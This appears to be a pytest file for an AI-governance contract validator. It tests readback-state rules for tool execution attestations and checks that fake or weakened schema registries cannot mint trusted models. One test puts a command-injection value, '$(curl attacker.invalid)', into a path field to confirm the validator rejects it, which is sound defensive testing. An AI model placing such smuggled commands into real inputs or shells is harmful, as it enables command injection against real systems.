from __future__ import annotations

import json
import shutil
from pathlib import Path

import pytest

from pr_inspector.aigov_errors import AIGOVValidationError
from pr_inspector.aigov_models import MODEL_BY_CONTRACT, is_validated_aigov_contract
from pr_inspector.aigov_schema_registry import (
    CONTRACT_TYPES,
    LocalAIGOVSchemaRegistry,
    local_aigov_schema_registry,
)
from pr_inspector.aigov_validation import (
    load_aigov_contract,
    load_aigov_json,
    validate_aigov_contract,
)


ROOT = Path(__file__).resolve().parents[1]
VALID = ROOT / "tests/fixtures/aigov/v2.5.0/schema_valid"


def _fixture(contract: str) -> dict:
    value = json.loads((VALID / f"{contract}.json").read_text(encoding="utf-8"))
    assert isinstance(value, dict)
    return value


def _codes(payload: dict) -> set[str]:
    return {
        item.code
        for item in validate_aigov_contract("tool_execution_attestation", payload)
    }


def _evidence(exact_identity: str) -> dict:
    return {
        "evidence_id": "readback-state-evidence",
        "evidence_type": "structured_record",
        "exact_identity": exact_identity,
        "source_digest": "sha256:" + "d" * 64,
        "retrieval_method": "github_api",
    }


def _claimed_history(payload: dict, status: str) -> None:
    payload["invocation_record"] = {
        "invocation_id": f"invocation-{status}",
        "claimed_execution": True,
        "execution_status": status,
        "executed_at": "2026-07-18T12:00:00Z",
    }


def test_verified_readback_requires_evidence_without_final_claims() -> None:
    payload = _fixture("tool_execution_attestation")
    payload["state_changed"] = False
    payload["readback_status"] = "VERIFIED"
    payload["readback_ref"] = None
    payload["readback_not_required_authority_ref"] = None
    payload["final_claim_bindings"] = []
    assert "AIGOV-SEM-220" in _codes(payload)


def test_verified_readback_requires_exact_result_identity_without_claims() -> None:
    payload = _fixture("tool_execution_attestation")
    payload["state_changed"] = False
    payload["readback_ref"] = _evidence("different-result")
    payload["final_claim_bindings"] = []
    assert "AIGOV-SEM-220" in _codes(payload)


def test_readback_not_required_rejects_populated_readback_reference() -> None:
    payload = _fixture("tool_execution_attestation")
    payload["state_changed"] = False
    payload["readback_status"] = "READBACK_NOT_REQUIRED"
    payload["readback_ref"] = _evidence("comment-900")
    payload["readback_not_required_authority_ref"] = _evidence(
        "readback-not-required-policy"
    )
    payload["final_claim_bindings"] = []
    assert "AIGOV-SEM-221" in _codes(payload)


def test_not_performed_rejects_populated_readback_reference() -> None:
    payload = _fixture("tool_execution_attestation")
    payload["state_changed"] = False
    payload["readback_status"] = "NOT_PERFORMED"
    payload["readback_ref"] = _evidence("comment-900")
    payload["readback_not_required_authority_ref"] = None
    payload["final_claim_bindings"] = []
    assert "AIGOV-SEM-222" in _codes(payload)


def test_not_performed_rejects_not_required_authority() -> None:
    payload = _fixture("tool_execution_attestation")
    payload["state_changed"] = False
    payload["readback_status"] = "NOT_PERFORMED"
    payload["readback_ref"] = None
    payload["readback_not_required_authority_ref"] = _evidence(
        "readback-not-required-policy"
    )
    payload["final_claim_bindings"] = []
    assert "AIGOV-SEM-222" in _codes(payload)


def test_failed_readback_rejects_verified_readback_claim() -> None:
    payload = _fixture("tool_execution_attestation")
    payload["state_changed"] = False
    payload["readback_status"] = "FAILED"
    payload["readback_ref"] = _evidence("readback-failure")
    payload["readback_not_required_authority_ref"] = None
    payload["final_claim_bindings"][0]["binding_status"] = (
        "VERIFIED_READBACK_BOUND"
    )
    assert "AIGOV-SEM-223" in _codes(payload)


def test_failed_readback_rejects_exact_verified_projection_without_claims() -> None:
    payload = _fixture("tool_execution_attestation")
    payload["state_changed"] = False
    payload["readback_status"] = "FAILED"
    payload["readback_ref"] = _evidence(payload["execution_result"]["result_identity"])
    payload["readback_not_required_authority_ref"] = None
    payload["final_claim_bindings"] = []
    assert "AIGOV-SEM-223" in _codes(payload)


def test_valid_readback_state_shapes_remain_representable() -> None:
    verified = _fixture("tool_execution_attestation")
    assert validate_aigov_contract("tool_execution_attestation", verified) == ()

    not_required = _fixture("tool_execution_attestation")
    not_required["state_changed"] = False
    not_required["readback_status"] = "READBACK_NOT_REQUIRED"
    not_required["readback_ref"] = None
    not_required["readback_not_required_authority_ref"] = _evidence(
        "readback-not-required-policy"
    )
    not_required["final_claim_bindings"][0]["binding_status"] = (
        "VERIFIED_RESULT_BOUND"
    )
    assert validate_aigov_contract("tool_execution_attestation", not_required) == ()

    failed = _fixture("tool_execution_attestation")
    _claimed_history(failed, "failed")
    failed["execution_result"] = {
        "result_identity": None,
        "captured_result_fields": [],
    }
    failed["state_changed"] = False
    failed["readback_status"] = "FAILED"
    failed["readback_ref"] = _evidence("failed-readback-evidence")
    failed["readback_not_required_authority_ref"] = None
    failed["final_claim_bindings"] = []
    assert validate_aigov_contract("tool_execution_attestation", failed) == ()

    not_performed = _fixture("tool_execution_attestation")
    _claimed_history(not_performed, "failed")
    not_performed["execution_result"] = {
        "result_identity": None,
        "captured_result_fields": [],
    }
    not_performed["state_changed"] = False
    not_performed["readback_status"] = "NOT_PERFORMED"
    not_performed["readback_ref"] = None
    not_performed["readback_not_required_authority_ref"] = None
    not_performed["final_claim_bindings"] = []
    assert validate_aigov_contract("tool_execution_attestation", not_performed) == ()


class FakeRegistry:
    def __init__(self) -> None:
        self.calls: list[tuple[str, str]] = []

    def validate(self, contract_type: str, payload: object):
        self.calls.append(("validate", contract_type))
        return ()

    def schema_id(self, contract_type: str) -> str:
        self.calls.append(("schema_id", contract_type))
        return "attacker-controlled-schema"

    def schema_sha256(self, contract_type: str) -> str:
        self.calls.append(("schema_sha256", contract_type))
        return "0" * 64


def test_fake_registry_cannot_reach_public_model_minting() -> None:
    fake = FakeRegistry()
    payload = _fixture("classification_record")

    assert validate_aigov_contract(
        "classification_record", payload, registry=fake
    ) == ()
    assert fake.calls == [("validate", "classification_record")]

    with pytest.raises(TypeError, match="canonical pinned"):
        load_aigov_contract("classification_record", payload, registry=fake)
    with pytest.raises(TypeError, match="canonical pinned"):
        load_aigov_json(
            "classification_record",
            json.dumps(payload),
            registry=fake,
        )
    assert fake.calls == [("validate", "classification_record")]


def test_missing_canonical_fields_cannot_be_minted_through_fake_registry() -> None:
    fake = FakeRegistry()
    weakened_payload = {
        "contract_type": "classification_record",
        "contract_version": "1.0",
        "activation_state": "inactive",
    }
    assert fake.validate("classification_record", weakened_payload) == ()

    with pytest.raises(TypeError, match="canonical pinned"):
        load_aigov_contract(
            "classification_record",
            weakened_payload,
            registry=fake,
        )
    with pytest.raises(AIGOVValidationError):
        load_aigov_contract("classification_record", weakened_payload)


def test_real_alternate_weakened_registry_is_diagnostic_only(
    tmp_path: Path,
) -> None:
    source = local_aigov_schema_registry().schema_dir
    target = tmp_path / "weakened-schemas"
    shutil.copytree(source, target)

    schema_path = target / "classification_record.schema.json"
    schema = json.loads(schema_path.read_text(encoding="utf-8"))
    allowed = {"contract_type", "contract_version", "activation_state"}
    schema["properties"] = {
        key: value for key, value in schema["properties"].items() if key in allowed
    }
    schema["required"] = sorted(allowed)
    schema.pop("allOf", None)
    schema_path.write_text(json.dumps(schema), encoding="utf-8")

    alternate = LocalAIGOVSchemaRegistry(target)
    weakened_payload = {
        "contract_type": "classification_record",
        "contract_version": "1.0",
        "activation_state": "inactive",
    }
    assert alternate.validate("classification_record", weakened_payload) == ()
    with pytest.raises(RuntimeError, match="canonical pinned"):
        alternate._canonical_mint_binding("classification_record")
    with pytest.raises(TypeError, match="canonical pinned"):
        load_aigov_contract(
            "classification_record",
            weakened_payload,
            registry=alternate,
        )


def test_canonical_singleton_still_mints_all_twelve_models() -> None:
    canonical = local_aigov_schema_registry()
    for contract in CONTRACT_TYPES:
        model = load_aigov_contract(contract, _fixture(contract), registry=canonical)
        assert type(model) is MODEL_BY_CONTRACT[contract]
        assert model.schema_id == canonical.schema_id(contract)
        assert model.provenance.schema_sha256 == canonical.schema_sha256(contract)
        assert is_validated_aigov_contract(model) is True


def test_canonical_model_minting_remains_schema_first() -> None:
    payload = _fixture("scope_record")
    payload["head_sha"] = "short"
    payload["included_paths"] = ["$(curl attacker.invalid)"]
    with pytest.raises(AIGOVValidationError) as caught:
        load_aigov_contract("scope_record", payload)
    assert {item.code for item in caught.value.diagnostics} == {"AIGOV-MODEL-003"}
